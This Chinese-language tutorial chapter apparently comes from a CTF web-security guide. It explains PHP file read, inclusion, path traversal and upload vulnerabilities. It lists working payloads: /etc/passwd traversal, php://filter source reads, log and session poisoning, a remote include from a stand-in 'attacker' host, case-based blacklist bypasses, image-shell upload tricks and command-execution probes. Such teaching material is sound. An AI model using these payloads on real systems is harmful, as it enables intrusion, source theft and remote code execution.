第 08 章　文件类漏洞：读取、包含、上传、穿越

文件是 Linux 上最有威力的东西。这一章把「路径可控」的四种后果讲清楚，并给出每种的最小验证方法。

本章你会得到

  • 四个概念的区分：任意文件读取 / 文件包含 / 路径穿越 / 文件上传
  • 文件包含的四条"武器化"路线（读文件、读源码、执行代码、远程包含）
  • 上传绕过的五种思路，以及"条件竞争"为什么存在

四个词的区别（新手最容易糊成一团）

名字代码长什么样你能做什么
任意文件读取echo file_get_contents($f);读文件内容（含源码/配置/密钥）
文件包含include($f);执行被包含文件里的 PHP 代码
路径穿越任何拼路径的地方 + ../跳出限定目录（"只能读 uploads/"变成"能读全盘"）
文件上传move_uploaded_file($_FILES...)把内容写到服务器磁盘上（配合上面三个用）
为什么"包含"比"读取"危险一个数量级

读取只能看，包含会执行。所以一个包含漏洞 + 一个"我能写进去的文件" = 完整的命令执行。 这也是为什么"日志投毒 / session 写马 / 上传 + 包含"总是一起出现：它们在凑这个组合。

文件包含的四条路线

① 直接读文件（最简单）

?file=../../../../etc/passwd
?file=/proc/self/cmdline        # 看进程启动参数，有时能看出跑的是什么

② 读源码（看起来"读到了"，其实是空的）

直接 ?file=index.php 会执行它，页面是渲染结果，不是源码。 要读源码必须套"过滤器"把它变成纯文本：

?file=php://filter/convert.base64-encode/resource=index.php
# 拿到 base64 → 解码 → 就是源码

③ 包含"我能写进去的文件"（getshell）

可写位置怎么把代码写进去注意
访问日志把 <?php ... ?> 放进 User-Agent，再包含 access.log 日志路径常被过滤（log 关键字）
session 文件让应用把输入存进 session（或 session.upload_progress） 路径 /tmp/sess_<sid> 含 tmp 时可能被挡
上传的文件先上传一个"图片马"，再包含它要绕过后缀/内容校验
PEAR 的命令行脚本include pearcmd.php，用 config-create 写文件 要求 register_argc_argv=On

④ 远程包含 / 伪协议

?file=http://attacker/shell.txt      # allow_url_include=On 才行
?file=data://text/plain,<?php ...    # 同上；常被 "data" 关键字挡
?file=php://input                     # 把 POST body 当代码（allow_url_include 也要开）
真实题目里最常见的坑：黑名单只拦小写

比如过滤写的是 preg_match('/data|php|tmp|log/', $f)，没有 /i。 那么 PHP://INPUT、DATA:// 全都能过，因为 PHP 的包装器名不区分大小写。 （这条是真实比赛里打出来的，见工具箱开发文档 §206。）

上传绕过的五种思路

校验方式绕过思路例子
只看后缀名换等价后缀 / 双后缀 / 大小写shell.php5、x.php.jpg、x.pHp
只看 Content-Type改请求头image/png 但内容是 PHP
看文件头（魔数）图片马：真图片 + 尾部塞 PHPGIF89a<?php ...
重命名/随机名让他告诉你名字（响应/页面）再从响应里读回文件名
落盘后校验再删条件竞争（边传边请求）抢"删之前"执行
为什么"图片马"要配"包含"或".htaccess"

因为图片后缀不会被当成脚本执行。要么让包含漏洞去 include 它， 要么上传 .htaccess / .user.ini 改变"什么后缀当脚本"的规则。 单独一个图片马，什么也不会发生 —— 这是新手最常误判的地方。

怎么验证"我这个文件真的被执行了"

不要用读 flag 当第一发。先用无副作用、能算出结果的小 payload：

<?php echo 7*7; ?>        → 页面出现 49，说明真的在跑 PHP
<?php phpinfo(); ?>        → 看到 phpinfo 页，说明环境信息全暴露
<?=`id`?>                  → 反引号执行命令，返回 uid=33(www-data)
工具箱里对应什么

lfi（包含/穿越）、php_filter_chain（过滤器链读源码）、 session_include（session 写马）、session_upload（upload_progress）、 pear_lfi（pearcmd 写文件）、logpoison（日志投毒）、 upload/upload_race/upload_include（上传三态）、 phar_deser（phar 反序列化）、zip_slip（压缩包路径穿越）。

本章小结

要点一句话
读 ≠ 包含包含会执行，所以更值钱
读源码要套 filter直接包含 .php 看到的是输出，不是代码
getshell 的公式包含点 + 一个能写进去的文件
上传要配执行条件后缀/配置/包含，三者缺一不可
